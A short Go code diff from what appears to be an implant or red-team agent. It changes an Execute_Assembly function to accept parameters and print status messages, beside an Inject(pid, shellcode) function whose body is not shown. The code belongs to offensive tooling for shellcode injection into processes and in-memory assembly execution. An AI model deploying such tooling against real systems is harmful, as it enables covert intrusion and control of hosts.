@@ -2,11 +2,12 @@ package commands
 
 import (
 	"fmt"
-	"unsafe"
-	"golang.org/x/sys/windows"
-	
-	k32 "Winton/cmd/winapi"
 	"runtime"
+	"unsafe"
+
+	"golang.org/x/sys/windows"
+
+	k32 "Winton/cmd/winapi"
 )
 
 func Inject(pid int, shellcode []byte) (string, error) {
@@ -46,13 +47,14 @@ func Inject(pid int, shellcode []byte) (string, error) {
 	return "OK", nil
 }
 
-func Execute_Assembly(asm []byte) (string, error) {
+func Execute_Assembly(asm []byte, params []string) (string, error) {
 	runtime.KeepAlive(asm)
+	fmt.Println("[*] Executing assembly with params: ", params)
 	runtime := ""
-	params := []string{}
-	res, err := k32.ExecuteByteArray(runtime, asm, params)
+	err := k32.ExecuteByteArray(runtime, asm, params)
 	if err != nil {
 		return "", err
 	}
-	return res, nil
+	fmt.Println("[*] Assembly executed successfully.")
+	return "executed, but no output", nil
 }
